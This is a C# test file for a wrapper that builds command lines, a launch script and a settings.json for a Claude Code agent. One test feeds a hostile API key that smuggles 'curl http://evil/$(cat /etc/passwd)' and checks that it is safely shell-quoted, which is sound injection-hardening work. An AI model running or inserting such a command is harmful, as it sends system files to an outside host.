using InspectAzureAI.Eval.Agents;
using InspectAzureAI.Provider.Core;
using InspectAzureAI.Swe.ClaudeCode;

namespace InspectAzureAI.Swe.Tests;

// The static entry point shares its name with its namespace, which shadows it from sibling namespaces.
using ClaudeCodeAgents = InspectAzureAI.Swe.ClaudeCode.ClaudeCode;

/// <summary>Port of inspect_swe <c>tests/test_claude_code_system_prompt.py</c> plus the argv, launch wrapper and settings.json command shapes.</summary>
public class ClaudeCodeCommandTests
{
    [Fact]
    public void system_prompt_appends_to_default()
    {
        Assert.Equal(
            ["--append-system-prompt", "Task prompt\n\nAgent prompt"],
            ClaudeCodeCommand.SystemPromptArgs(["Task prompt", "Agent prompt"], null, isResume: false));
    }

    [Fact]
    public void system_prompt_can_replace_default()
    {
        Assert.Equal(["--system-prompt", "Replacement prompt"], ClaudeCodeCommand.SystemPromptArgs([], "Replacement prompt", isResume: false));
    }

    [Fact]
    public void task_prompt_is_appended_to_replacement()
    {
        Assert.Equal(
            ["--system-prompt", "Replacement prompt", "--append-system-prompt", "Task prompt"],
            ClaudeCodeCommand.SystemPromptArgs(["Task prompt"], "Replacement prompt", isResume: false));
    }

    [Fact]
    public void empty_system_prompts_add_no_cli_flags()
    {
        Assert.Empty(ClaudeCodeCommand.SystemPromptArgs([], null, isResume: false));
    }

    [Fact]
    public void resume_reapplies_replacement_without_appended_messages()
    {
        Assert.Equal(
            ["--system-prompt", "Replacement prompt"],
            ClaudeCodeCommand.SystemPromptArgs(["Round-tripped prompt"], "Replacement prompt", isResume: true));
        Assert.Empty(ClaudeCodeCommand.SystemPromptArgs(["Round-tripped prompt"], null, isResume: true));
    }

    [Fact]
    public void system_texts_come_from_system_messages_then_the_agent_prompt()
    {
        var messages = new ChatMessage[] { new ChatMessageSystem("One"), new ChatMessageUser("q"), new ChatMessageSystem("Two") };

        Assert.Equal(["One", "Two", "Agent"], ClaudeCodeCommand.SystemTexts(messages, "Agent"));
        Assert.Equal(["One", "Two"], ClaudeCodeCommand.SystemTexts(messages, null));
        Assert.Empty(ClaudeCodeCommand.SystemTexts([new ChatMessageUser("q")], null));
    }

    [Fact]
    public void base_flags_default_to_skipping_permissions()
    {
        Assert.Equal(
            ["--dangerously-skip-permissions", "--model", "claude-sonnet-4-5", "--print", "--output-format", "stream-json", "--verbose"],
            ClaudeCodeCommand.BaseFlags("claude-sonnet-4-5"));
    }

    [Fact]
    public void base_flags_include_permission_mode_debug_and_disallowed_tools()
    {
        var flags = ClaudeCodeCommand.BaseFlags("m", permissionMode: "acceptEdits", debug: true, disallowedTools: ["WebSearch", "Bash"]);

        Assert.Equal(
            ["--permission-mode", "acceptEdits", "--model", "m", "--print", "--output-format", "stream-json", "--verbose", "--debug", "--disallowed-tools", "WebSearch,Bash"],
            flags);
        Assert.DoesNotContain("--disallowed-tools", ClaudeCodeCommand.BaseFlags("m", disallowedTools: []));
    }

    [Fact]
    public void argv_starts_a_session_or_resumes_it_and_ends_with_the_prompt()
    {
        var flags = new[] { "--model", "m" };
        var systemArgs = new[] { "--append-system-prompt", "sys" };

        var fresh = ClaudeCodeCommand.Build("/bin/claude", "sid", isResume: false, flags, systemArgs, "do it");
        var resumed = ClaudeCodeCommand.Build("/bin/claude", "sid", isResume: true, flags, [], "again");

        Assert.Equal(["/bin/claude", "--session-id", "sid", "--model", "m", "--append-system-prompt", "sys", "--", "do it"], fresh);
        Assert.Equal(["/bin/claude", "--resume", "sid", "--model", "m", "--", "again"], resumed);
    }

    [Fact]
    public void launch_wrapper_closes_stdin_before_exec()
    {
        var launch = ClaudeCodeCommand.Launch(["/bin/claude", "--", "hi"]);

        Assert.Equal(["bash", "-c", "exec 0</dev/null; \"$@\"", "bash", "/bin/claude", "--", "hi"], launch);
    }

    [Fact]
    public void settings_command_writes_the_api_key_helper()
    {
        // Python writes the key bare; the helper runs through a shell, so it is single-quoted here (same echo output).
        Assert.Equal("{\"apiKeyHelper\": \"echo 'sk-ant-api03-DOq5tyLPrk9M4hPE'\"}", ClaudeCodeCommand.SettingsJson("sk-ant-api03-DOq5tyLPrk9M4hPE"));
        Assert.Equal(
            "mkdir -p \"$HOME/.claude\" && echo '{\"apiKeyHelper\": \"echo '\\''abc123'\\''\"}' > \"$HOME/.claude/settings.json\"",
            ClaudeCodeCommand.SettingsCommand("abc123"));
    }

    [Fact]
    public void settings_json_escapes_a_hostile_key_and_the_command_quotes_it()
    {
        const string key = "a\"b'c; curl http://evil/$(cat /etc/passwd)";
        var json = ClaudeCodeCommand.SettingsJson(key);

        // Claude Code hands the helper to a shell, so the key itself is single-quoted inside the JSON string.
        Assert.Equal("echo " + ClaudeCodeCommand.ShellQuote(key), System.Text.Json.Nodes.JsonNode.Parse(json)!["apiKeyHelper"]!.GetValue<string>());
        Assert.Equal("{\"apiKeyHelper\": \"echo 'a\\\"b'\\\\''c; curl http://evil/$(cat /etc/passwd)'\"}", json);
        Assert.Equal("mkdir -p \"$HOME/.claude\" && echo " + ClaudeCodeCommand.ShellQuote(json) + " > \"$HOME/.claude/settings.json\"", ClaudeCodeCommand.SettingsCommand(key));
        Assert.Equal("{\"apiKeyHelper\": \"echo 'plain'\"}", ClaudeCodeCommand.SettingsJson("plain"));
    }

    [Fact]
    public void shell_quote_escapes_single_quotes()
    {
        Assert.Equal("'plain'", ClaudeCodeCommand.ShellQuote("plain"));
        Assert.Equal("'it'\\''s'", ClaudeCodeCommand.ShellQuote("it's"));
    }
}

/// <summary>Port of the <c>claude_code()</c> validation rules (<c>claude_code.py:107-111, 267-270</c>) and the option defaults.</summary>
public class ClaudeCodeOptionsTests
{
    [Fact]
    public void append_and_replace_system_prompts_are_mutually_exclusive()
    {
        var ex = Assert.Throws<ArgumentException>(() => ClaudeCodeAgents.Agent(new ClaudeCodeOptions { SystemPrompt = "Additional prompt", ReplaceSystemPrompt = "Replacement prompt" }));

        Assert.Equal("system_prompt and replace_system_prompt cannot both be specified", ex.Message);
    }

    [Fact]
    public void unknown_permission_mode_is_rejected()
    {
        var ex = Assert.Throws<ArgumentException>(() => new ClaudeCodeAgent(new ClaudeCodeOptions { PermissionMode = "yolo" }));

        Assert.Equal("permission_mode must be one of 'acceptEdits', 'auto', 'bypassPermissions', 'default', 'dontAsk', or 'plan'.", ex.Message);
        foreach (var mode in ClaudeCodeOptions.PermissionModes)
        {
            new ClaudeCodeOptions { PermissionMode = mode }.Validate();
        }
    }

    [Fact]
    public void unknown_effort_is_rejected()
    {
        var ex = Assert.Throws<ArgumentException>(() => new ClaudeCodeOptions { Effort = "extreme" }.Validate());

        Assert.Equal("effort must be one of 'low', 'medium', 'high', 'xhigh', or 'max'.", ex.Message);
        foreach (var effort in ClaudeCodeOptions.EffortLevels)
        {
            new ClaudeCodeOptions { Effort = effort }.Validate();
        }
    }

    [Fact]
    public void defaults_match_python()
    {
        var options = new ClaudeCodeOptions();

        Assert.Equal("Claude Code", options.Name);
        Assert.Equal("Autonomous coding agent capable of writing, testing, debugging,\nand iterating on code across multiple languages.", options.Description);
        Assert.Equal("auto", options.Version);
        Assert.Equal(3, options.RetryRefusals);
        Assert.Equal(3, options.RetryUncaughtErrors);
        Assert.Equal(new AgentAttempts(), options.Attempts);
        Assert.Null(options.PermissionMode);
        Assert.False(options.Debug);
        Assert.Equal(0, options.Port);
    }

    [Fact]
    public void agent_definition_carries_name_description_and_a_per_instance_session()
    {
        var def = ClaudeCodeAgents.Agent(new ClaudeCodeOptions { Name = "cc", Description = "desc" });
        var first = new ClaudeCodeAgent(new ClaudeCodeOptions());
        var second = new ClaudeCodeAgent(new ClaudeCodeOptions());

        Assert.Equal("cc", def.Name);
        Assert.Equal("desc", def.Description);
        Assert.NotNull(def.Execute);
        Assert.True(Guid.TryParse(first.SessionId, out _));
        Assert.NotEqual(first.SessionId, second.SessionId);
        Assert.EndsWith(Path.Combine(".cache", "inspect-azureai", "claude-code-downloads"), first.Binary.CacheDir);
    }
}
